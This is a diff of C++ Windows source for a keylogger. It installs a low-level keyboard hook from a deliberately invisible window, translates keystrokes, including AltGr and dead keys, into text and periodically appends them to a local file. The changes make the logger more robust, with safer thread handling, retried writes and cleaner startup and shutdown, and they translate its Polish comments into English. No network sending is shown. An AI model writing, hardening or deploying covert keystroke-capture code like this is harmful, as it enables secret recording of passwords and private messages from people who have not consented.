@@ -6,6 +6,7 @@
 #include <chrono>
 #include <fstream>
 #include <sstream>
+#include <atomic>
 #include <shlobj.h> 
 #include <shlwapi.h>
 
@@ -22,15 +23,50 @@ static std::mutex g_mtx;
 static std::condition_variable g_cv;
 
 static std::atomic<bool> g_running{ true };
-static std::atomic<long long> g_lastKeyTickMs{ 0 };
+static std::atomic<unsigned long long> g_lastInputTickMs{ 0 };
+static std::atomic<unsigned long long> g_lastIdleMarkerTickMs{ 0 };
 
 static constexpr wchar_t kClassName[] = L"HiddenHookWindowClass";
 static constexpr wchar_t kWindowName[] = L"HiddenHookWindow";
 static HHOOK g_hook = nullptr;
 static HWND g_hwnd = nullptr;
 
-static HANDLE g_writerThread = nullptr;
-static HANDLE g_idleThread = nullptr;
+class UniqueHandle
+{
+public:
+    UniqueHandle() = default;
+    ~UniqueHandle()
+    {
+        reset();
+    }
+
+    UniqueHandle(const UniqueHandle&) = delete;
+    UniqueHandle& operator=(const UniqueHandle&) = delete;
+
+    HANDLE get() const
+    {
+        return value;
+    }
+
+    void reset(HANDLE newValue = nullptr)
+    {
+        if (value)
+            CloseHandle(value);
+
+        value = newValue;
+    }
+
+    explicit operator bool() const
+    {
+        return value != nullptr;
+    }
+
+private:
+    HANDLE value = nullptr;
+};
+
+static UniqueHandle g_writerThread;
+static UniqueHandle g_idleThread;
 static DWORD  g_writerTid = 0;
 static DWORD  g_idleTid = 0;
 
@@ -39,6 +75,8 @@ static const auto kWritePeriod = std::chrono::minutes(1);
 static const auto kTypingCooldown = std::chrono::milliseconds(800);  // "user is typing" window
 static const auto kIdleThreshold = std::chrono::seconds(3);
 static std::wstring outputFile = L"";
+
+static void DebugLog(const std::wstring& msg);
 
 std::wstring GetSaveDir()
 {
@@ -66,20 +104,20 @@ static void InitSaveFile()
     outputFile = CombinePathWinApi(path, fileName);
 }
 
-static long long NowTickMs()
+static unsigned long long NowTickMs()
 {
-    return static_cast<long long>(GetTickCount64());
+    return GetTickCount64();
 }
 
-//Czy u¿ytkownik pisze na klawiaturze
+// Checks whether the user is actively typing.
 static bool IsUserTyping()
 {
-    long long last = g_lastKeyTickMs.load(std::memory_order_relaxed);
-    long long now = NowTickMs();
-    return (now - last) <= static_cast<long long>(duration_cast<milliseconds>(kTypingCooldown).count());
+    unsigned long long last = g_lastInputTickMs.load(std::memory_order_relaxed);
+    unsigned long long now = NowTickMs();
+    return (now - last) <= static_cast<unsigned long long>(duration_cast<milliseconds>(kTypingCooldown).count());
 }
 
-//Doddawanie do bufora
+// Adds a value to the shared output buffer.
 static void BufferPush(std::wstring s)
 {
     {
@@ -89,7 +127,7 @@ static void BufferPush(std::wstring s)
     g_cv.notify_all();
 }
 
-// Zapisanie bufora do pliku
+// Writes the shared buffer to the output file.
 static void FlushBufferToFile()
 {
     std::vector<std::wstring> snapshot;
@@ -104,7 +142,11 @@ static void FlushBufferToFile()
 
     std::wofstream out(outputFile, std::ios::app);
     if (!out.is_open())
+    {
+        std::lock_guard<std::mutex> lk(g_mtx);
+        g_buffer.insert(g_buffer.begin(), snapshot.begin(), snapshot.end());
         return;
+    }
 
     SYSTEMTIME st;
     GetLocalTime(&st);
@@ -118,10 +160,16 @@ static void FlushBufferToFile()
         out << line;
 
     out << L"\n";
+
+    if (!out)
+    {
+        std::lock_guard<std::mutex> lk(g_mtx);
+        g_buffer.insert(g_buffer.begin(), snapshot.begin(), snapshot.end());
+    }
 }
 
 // ----------------------------
-// W¹tek: zapis do pliku
+// Thread: periodic file writer
 // ----------------------------
 static DWORD WINAPI WriterThreadProc(LPVOID)
 {
@@ -162,30 +210,33 @@ static DWORD WINAPI WriterThreadProc(LPVOID)
 }
 
 // ----------------------------
-// W¹tek: dodaje bia³e znaki do bufora jak u¿ytkownik nic nie robi
+// Thread: adds spacing when the user is idle.
 // ----------------------------
 static DWORD WINAPI IdleThreadProc(LPVOID)
 {
-    std::unique_lock<std::mutex> lk(g_mtx);
-
     while (g_running.load())
     {
+        std::unique_lock<std::mutex> lk(g_mtx);
         g_cv.wait_for(lk, std::chrono::milliseconds(200), [] {
             return !g_running.load();
         });
+        lk.unlock();
 
         if (!g_running.load())
             break;
 
-        long long now = NowTickMs();
-        long long last = g_lastKeyTickMs.load(std::memory_order_relaxed);
+        unsigned long long now = NowTickMs();
+        unsigned long long lastInput = g_lastInputTickMs.load(std::memory_order_relaxed);
+        unsigned long long lastMarker = g_lastIdleMarkerTickMs.load(std::memory_order_relaxed);
 
-        auto idleMs = now - last;
-        if (idleMs >= static_cast<long long>(duration_cast<milliseconds>(kIdleThreshold).count()))
+        auto idleMs = now - lastInput;
+        auto markerMs = now - lastMarker;
+        auto idleThresholdMs = static_cast<unsigned long long>(duration_cast<milliseconds>(kIdleThreshold).count());
+
+        if (idleMs >= idleThresholdMs && markerMs >= idleThresholdMs)
         {
-            g_buffer.push_back(L"    "); // 4 spacje
-            g_lastKeyTickMs.store(now, std::memory_order_relaxed);
-            g_cv.notify_all();
+            BufferPush(L"    "); // 4 spaces
+            g_lastIdleMarkerTickMs.store(now, std::memory_order_relaxed);
         }
     }
 
@@ -194,18 +245,35 @@ static DWORD WINAPI IdleThreadProc(LPVOID)
 
 static bool CreateThreads()
 {
-    g_lastKeyTickMs.store(NowTickMs(), std::memory_order_relaxed);
+    unsigned long long now = NowTickMs();
+    g_lastInputTickMs.store(now, std::memory_order_relaxed);
+    g_lastIdleMarkerTickMs.store(now, std::memory_order_relaxed);
 
     g_running.store(true);
 
-    g_writerThread = CreateThread(nullptr, 0, WriterThreadProc, nullptr, 0, &g_writerTid);
-    g_idleThread = CreateThread(nullptr, 0, IdleThreadProc, nullptr, 0, &g_idleTid);
+    g_writerThread.reset(CreateThread(nullptr, 0, WriterThreadProc, nullptr, 0, &g_writerTid));
+    g_idleThread.reset(CreateThread(nullptr, 0, IdleThreadProc, nullptr, 0, &g_idleTid));
 
     if (!g_writerThread || !g_idleThread)
     {
         BufferPush(L"CreateThread failed.");
-        return -1;
+        g_running.store(false);
+        g_cv.notify_all();
+
+        HANDLE handles[2] = { g_writerThread.get(), g_idleThread.get() };
+        for (auto h : handles)
+        {
+            if (h)
+                WaitForSingleObject(h, 3000);
+        }
+
+        g_writerThread.reset();
+        g_idleThread.reset();
+
+        return false;
     }
+
+    return true;
 }
 
 static bool CloseThreads()
@@ -213,20 +281,28 @@ static bool CloseThreads()
     g_running.store(false);
     g_cv.notify_all();
 
-    HANDLE handles[2] = { g_writerThread, g_idleThread };
+    bool stoppedCleanly = true;
+    HANDLE handles[2] = { g_writerThread.get(), g_idleThread.get() };
     for (auto h : handles)
     {
         if (h)
-            WaitForSingleObject(h, 3000);
+        {
+            DWORD result = WaitForSingleObject(h, 3000);
+            if (result != WAIT_OBJECT_0)
+            {
+                DebugLog(L"Thread did not stop cleanly.");
+                stoppedCleanly = false;
+            }
+        }
     }
 
-    if (g_writerThread) { CloseHandle(g_writerThread); g_writerThread = nullptr; }
-    if (g_idleThread) { CloseHandle(g_idleThread);   g_idleThread = nullptr; }
+    g_writerThread.reset();
+    g_idleThread.reset();
 
-    return true;
+    return stoppedCleanly;
 }
 
-//Na potrzeby debugowania
+// Debug logging helper.
 static void DebugLog(const std::wstring& msg)
 {
     OutputDebugStringW((msg + L"\n").c_str());
@@ -269,14 +345,14 @@ std::wstring VkCodeToUnicode(
     // CapsLock
     SetKeyToggled(keyboardState, VK_CAPITAL, capsLock);
 
-    // Prawy Alt (AltGr)
-    // Windows czêsto interpretuje AltGr jako RAlt + LCtrl.
+    // Right Alt (AltGr).
+    // Windows often interprets AltGr as RAlt + LCtrl.
     SetKeyDown(keyboardState, VK_RMENU, rightAlt);
-    SetKeyDown(keyboardState, VK_MENU, rightAlt);      // czasem pomaga dla czêœci layoutów
+    SetKeyDown(keyboardState, VK_MENU, rightAlt);
 
     if (rightAlt)
     {
-        // Symuluj Ctrl dla AltGr (kluczowe na wielu layoutach)
+        // Simulate Ctrl for AltGr, which is required on many layouts.
         SetKeyDown(keyboardState, VK_CONTROL, true);
         SetKeyDown(keyboardState, VK_LCONTROL, true);
     }
@@ -296,7 +372,7 @@ std::wstring VkCodeToUnicode(
 
     if (rc == -1)
     {
-        //czyœcimy stan
+        // Clear the dead-key state.
         WCHAR dummy[16]{};
         ToUnicodeEx(vkCode, scanCode, keyboardState, dummy, (int)(std::size(dummy) - 1), flags, layout);
         return L"";
@@ -319,8 +395,8 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
 
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
         {
-            g_lastKeyTickMs.store(NowTickMs(), std::memory_order_relaxed);
-            // Zamkniêcie aplikacji: Ctrl + Shift + Q
+            g_lastInputTickMs.store(NowTickMs(), std::memory_order_relaxed);
+            // Application shutdown shortcut: Ctrl + Shift + Q.
 
             const bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
             const bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
@@ -391,9 +467,16 @@ static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lPara
     {
         case WM_CREATE:        
         InitSaveFile();
-        // instalujemy hook po utworzeniu okna
-        InstallHook();
-        CreateThreads();
+        // Install the hook after the hidden window is created.
+        if (!InstallHook())
+            return -1;
+
+        if (!CreateThreads())
+        {
+            UninstallHook();
+            return -1;
+        }
+
         BufferPush(L"App started. \n");
         return 0;
 
@@ -402,8 +485,8 @@ static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lPara
         return 0;
 
         case WM_DESTROY:
-        CloseThreads();
         UninstallHook();
+        CloseThreads();
         
         // Final flush
         FlushBufferToFile();
@@ -420,7 +503,7 @@ static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lPara
 // -------------------------
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
 {
-    // Rejestracja klasy okna
+    // Register the window class.
     WNDCLASSEXW wc{};
     wc.cbSize = sizeof(wc);
     wc.lpfnWndProc = WndProc;
@@ -430,12 +513,12 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
     if (!RegisterClassExW(&wc))
         return 1;
 
-    // Tworzymy okno ukryte (bez WS_VISIBLE)
+    // Create a hidden window without calling ShowWindow.
     g_hwnd = CreateWindowExW(
         0,
         kClassName,
         kWindowName,
-        WS_OVERLAPPEDWINDOW, // styl okna (nie bêdzie widoczne, bo nie robimy ShowWindow)
+        WS_OVERLAPPEDWINDOW,
         CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
         nullptr,
         nullptr,
@@ -446,7 +529,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
     if (!g_hwnd)
         return 2;
 
-    // Nie wywo³ujemy ShowWindow/UpdateWindow -> okno pozostaje niewidoczne
+    // The window remains hidden because ShowWindow/UpdateWindow are not called.
 
     DebugLog(L"[app] Running hidden. Press Ctrl+Shift+Q to exit.");
     
